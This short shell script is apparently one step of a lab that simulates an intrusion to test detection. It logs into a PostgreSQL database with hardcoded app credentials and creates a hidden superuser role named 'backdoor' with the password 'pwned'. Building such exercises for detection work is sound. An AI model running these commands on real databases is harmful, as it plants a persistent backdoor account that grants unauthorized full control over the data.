#!/bin/sh
# 5b. Persistence in the database: an attacker who reached the backend pivots to
# PostgreSQL and creates a rogue login role. Runs on the db network, with the
# app credentials the backend uses. Detection needs the DB to log (db-log-agent).
. "$(dirname "$0")/../lib.sh"
echo "5b. Compte pirate dans la base PostgreSQL"
on db sh -c '
export PGPASSWORD=app_pw
psql -h db -U app -d shop -c "DROP ROLE IF EXISTS backdoor; CREATE ROLE backdoor LOGIN SUPERUSER PASSWORD '"'"'pwned'"'"';" 2>&1
psql -h db -U app -d shop -c "\du backdoor" 2>&1
'
